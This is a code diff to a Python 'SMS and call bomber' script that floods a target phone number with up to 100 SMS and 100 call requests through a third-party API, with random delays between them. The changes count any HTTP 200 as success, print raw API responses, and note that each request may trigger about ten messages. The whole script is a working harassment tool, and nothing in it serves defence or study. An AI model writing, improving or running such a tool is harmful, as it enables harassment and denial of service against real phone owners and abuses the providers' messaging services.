@@ -54,14 +54,11 @@ def send_request(phone, request_type):
 
     try:
         response = requests.get(url, params=params, headers=headers, timeout=10)
+        # Print raw response for debugging
+        print(f"{Colors.YELLOW}Debug: Raw API response: {response.text}{Colors.RESET}")
+        # Assume success on HTTP 200, as API sends messages but may return misleading status
         if response.status_code == 200:
-            try:
-                json_response = response.json()
-                if json_response.get("success", False) or "success" in json_response.get("status", "").lower():
-                    return {"success": True, "status": "Success"}
-                return {"success": False, "status": f"Failed: {json_response.get('message', 'Unknown error')}"}
-            except ValueError:
-                return {"success": True, "status": "Success (Non-JSON response)"}
+            return {"success": True, "status": "Success (Note: May trigger multiple messages)"}
         return {"success": False, "status": f"Failed: HTTP {response.status_code}"}
     except requests.RequestException as e:
         return {"success": False, "status": f"Failed: {str(e)}"}
@@ -79,8 +76,8 @@ def main():
 
     # Count input for SMS and Calls
     try:
-        sms_count = int(input(f"{Colors.CYAN}Enter number of SMS (0-100): {Colors.RESET}").strip())
-        call_count = int(input(f"{Colors.CYAN}Enter number of Calls (0-100): {Colors.RESET}").strip())
+        sms_count = int(input(f"{Colors.CYAN}Enter number of SMS requests (0-100): {Colors.RESET}").strip())
+        call_count = int(input(f"{Colors.CYAN}Enter number of Call requests (0-100): {Colors.RESET}").strip())
         if not (0 <= sms_count <= 100 and 0 <= call_count <= 100):
             raise ValueError
         if sms_count == 0 and call_count == 0:
@@ -103,7 +100,8 @@ def main():
         return
 
     total_requests = sms_count + call_count
-    print(f"\n{Colors.YELLOW}Starting bombing to {phone} with {sms_count} SMS and {call_count} calls (delay: {delay}s)...{Colors.RESET}")
+    print(f"\n{Colors.YELLOW}Starting bombing to {phone} with {sms_count} SMS requests and {call_count} call requests (delay: {delay}s)...{Colors.RESET}")
+    print(f"{Colors.YELLOW}Note: Each SMS request may trigger multiple messages (e.g., 10 SMS per request).{Colors.RESET}")
 
     # Create and shuffle request list
     request_list = [("sms", API) for _ in range(sms_count)] + [("call", API) for _ in range(call_count)]
@@ -112,7 +110,7 @@ def main():
     for i, (request_type, _) in enumerate(request_list, 1):
         result = send_request(phone, request_type)
         if result["success"]:
-            print(f"{Colors.GREEN}[{i}/{total_requests}] {API['name']} ({request_type.upper()}): Success{Colors.RESET}")
+            print(f"{Colors.GREEN}[{i}/{total_requests}] {API['name']} ({request_type.upper()}): {result['status']}{Colors.RESET}")
         else:
             print(f"{Colors.RED}[{i}/{total_requests}] {API['name']} ({request_type.upper()}): {result['status']}{Colors.RESET}")
         time.sleep(delay + random.uniform(0, 1))
